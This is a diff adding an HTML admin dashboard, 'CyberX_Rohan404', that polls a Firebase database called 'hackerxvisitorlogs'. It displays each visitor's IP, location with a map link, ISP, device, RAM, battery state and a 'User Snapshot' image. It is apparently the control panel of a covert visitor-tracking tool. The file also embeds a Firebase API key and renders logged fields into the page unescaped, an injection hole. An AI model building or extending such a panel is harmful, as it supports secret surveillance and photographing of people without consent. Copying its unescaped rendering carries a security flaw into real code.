@@ -1,0 +1,156 @@
+<!DOCTYPE html><html lang="en"><head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Admin Dashboard - CyberX_Rohan404</title>
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron&display=swap" rel="stylesheet">
+  <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Orbitron', sans-serif; }
+    body { background: #000; color: #00ffee; padding: 20px; overflow-x: hidden; }
+    h1 { text-align: center; margin-bottom: 2rem; font-size: 1.8rem; color: #00ffcc; text-shadow: 0 0 10px #00ffee; }
+    .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin-bottom: 2rem; }
+    .card { background: #111; padding: 15px; border-radius: 15px; box-shadow: 0 0 12px #00ffee; text-align: center; }
+    .card h2 { font-size: 1.2rem; color: #ff00ff; margin-bottom: 10px; }
+    .card p { font-size: 1rem; color: #00ffcc; }
+    canvas { background: #111; border-radius: 15px; box-shadow: 0 0 10px #00ffee; margin: 1rem auto; display: block; }
+    .user-section { background: #111; margin-bottom: 2rem; padding: 1rem; border-radius: 20px; box-shadow: 0 0 12px #00ffee; word-break: break-word; }
+    .user-section h3 { font-size: 1.2rem; margin-bottom: 0.5rem; color: #ff00ff; }
+    .user-section p { margin: 0.3rem 0; font-size: 0.92rem; }
+    .user-section img { width: 100%; max-width: 300px; border-radius: 12px; margin-top: 1rem; box-shadow: 0 0 10px #00f5ff; }
+    .footer { text-align: center; margin-top: 3rem; color: #888; font-size: 0.9rem; }
+    @media (max-width: 600px) {
+      .card h2 { font-size: 1rem; }
+      .user-section h3 { font-size: 1rem; }
+    }
+  </style>
+</head>
+<body>
+  <h1>📊 CyberX_Rohan404 Admin Dashboard (Live Users After 27/07/2025 - 10:30 AM)</h1>
+  <audio id="bgMusic" autoplay loop>
+    <source src="https://www.bensound.com/bensound-music/bensound-dubstep.mp3" type="audio/mpeg">
+  </audio>
+  <div class="stats">
+    <div class="card"><h2>👥 Total Visitors</h2><p id="totalVisitors">0</p></div>
+    <div class="card"><h2>📅 Today's Visitors</h2><p id="todaysVisitors">0</p></div>
+    <div class="card"><h2>🆕 New Users</h2><p id="newUsers">0</p></div>
+    <div class="card"><h2>🟢 Online Users</h2><p id="onlineUsers">0</p></div>
+  </div>
+  <canvas id="trafficChart" width="600" height="300"></canvas>
+  <canvas id="deviceChart" width="600" height="300"></canvas>
+  <canvas id="browserChart" width="600" height="300"></canvas>  <div id="dashboard"></div>
+  <div class="footer">© 2025 CyberX_Rohan404. All Rights Reserved 👾🔥</div>  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>  <script>
+    const firebaseConfig = {
+      apiKey: "AIzaSyCPx4E6VmKe9kLjXO4he849G2P0hS0m_2I",
+      authDomain: "hackerxvisitorlogs.firebaseapp.com",
+      databaseURL: "https://hackerxvisitorlogs-default-rtdb.firebaseio.com",
+      projectId: "hackerxvisitorlogs",
+      storageBucket: "hackerxvisitorlogs.appspot.com",
+      messagingSenderId: "939200682027",
+      appId: "1:939200682027:web:fbdd62e259aacba4e0f26e"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    const dashboard = document.getElementById("dashboard");
+    const totalVisitors = document.getElementById("totalVisitors");
+    const todaysVisitors = document.getElementById("todaysVisitors");
+    const newUsers = document.getElementById("newUsers");
+    const onlineUsers = document.getElementById("onlineUsers");
+
+    let trafficChart, deviceChart, browserChart;
+
+    function renderDashboard(data) {
+      dashboard.innerHTML = "";
+      let allUsers = [], devices = {}, browsers = {};
+      let todayCount = 0, newUserCount = 0, online = 0;
+      const now = new Date();
+
+      const entries = Object.entries(data).filter(([_, v]) => {
+        const date = new Date(v.timestamp);
+        return date >= new Date("2025-07-27T05:00:00Z");
+      }).reverse();
+
+      totalVisitors.textContent = entries.length;
+
+      entries.forEach(([id, v], i) => {
+        const date = new Date(v.timestamp);
+        if (date.toDateString() === now.toDateString()) todayCount++;
+        if ((now - date) / 60000 < 5) online++;
+
+        const browser = v.userAgent.match(/(Chrome|Firefox|Safari|Edge|Opera)/i);
+        const device = v.brandModel || 'Unknown';
+
+        if (device) devices[device] = (devices[device] || 0) + 1;
+        if (browser) browsers[browser[0]] = (browsers[browser[0]] || 0) + 1;
+
+        const div = document.createElement("div");
+        div.className = "user-section";
+        div.innerHTML = `
+          <h3>👤 User #${i + 1}</h3>
+          <p><strong>🕒 Timestamp:</strong> ${v.timestamp}</p>
+          <p><strong>🌍 Location:</strong> ${v.city}, ${v.region}, ${v.country}</p>
+          <p><strong>🗺️ Map:</strong> <a href="${v.mapLink}" target="_blank">Open in Google Maps</a></p>
+          <p><strong>📡 IP:</strong> ${v.ip}</p>
+          <p><strong>🌐 ISP:</strong> ${v.isp} (${v.asn})</p>
+          <p><strong>📱 Device:</strong> ${device}</p>
+          <p><strong>🧠 User Agent:</strong><br>${v.userAgent}</p>
+          <p><strong>📶 Network:</strong> ${v.network}</p>
+          <p><strong>📐 Resolution:</strong> ${v.resolution}</p>
+          <p><strong>💾 RAM:</strong> ${v.ram || 'Unknown'} GB</p>
+          <p><strong>🔋 Battery:</strong> ${v.battery} (Charging: ${v.charging})</p>
+          ${v.image ? `<img src="${v.image}" alt="User Snapshot">` : ''}
+        `;
+        dashboard.appendChild(div);
+      });
+
+      todaysVisitors.textContent = todayCount;
+      newUsers.textContent = entries.length; // Same as total for now
+      onlineUsers.textContent = online;
+
+      const ctxTraffic = document.getElementById('trafficChart').getContext('2d');
+      const ctxDevice = document.getElementById('deviceChart').getContext('2d');
+      const ctxBrowser = document.getElementById('browserChart').getContext('2d');
+
+      if (trafficChart) trafficChart.destroy();
+      if (deviceChart) deviceChart.destroy();
+      if (browserChart) browserChart.destroy();
+
+      trafficChart = new Chart(ctxTraffic, {
+        type: 'line',
+        data: {
+          labels: entries.map((e, i) => `#${i + 1}`),
+          datasets: [{ label: 'Live Users', data: entries.map(e => 1), borderColor: '#00ffcc', fill: false }]
+        },
+        options: { plugins: { legend: { labels: { color: '#fff' } } }, scales: { x: { ticks: { color: '#fff' } }, y: { ticks: { color: '#fff' } } } }
+      });
+
+      deviceChart = new Chart(ctxDevice, {
+        type: 'doughnut',
+        data: {
+          labels: Object.keys(devices),
+          datasets: [{ data: Object.values(devices), backgroundColor: ['#00ffcc', '#ff00cc', '#ffcc00', '#00ccff'] }]
+        },
+        options: { plugins: { legend: { labels: { color: '#fff' } } } }
+      });
+
+      browserChart = new Chart(ctxBrowser, {
+        type: 'bar',
+        data: {
+          labels: Object.keys(browsers),
+          datasets: [{ label: 'Browser Usage', data: Object.values(browsers), backgroundColor: '#ff00cc' }]
+        },
+        options: { plugins: { legend: { labels: { color: '#fff' } } }, scales: { x: { ticks: { color: '#fff' } }, y: { ticks: { color: '#fff' } } } }
+      });
+    }
+
+    function fetchAndRender() {
+      db.ref('visitors').once('value', snapshot => {
+        const data = snapshot.val();
+        if (data) renderDashboard(data);
+      });
+    }
+
+    fetchAndRender();
+    setInterval(fetchAndRender, 10000);
+  </script></body>
+</html>
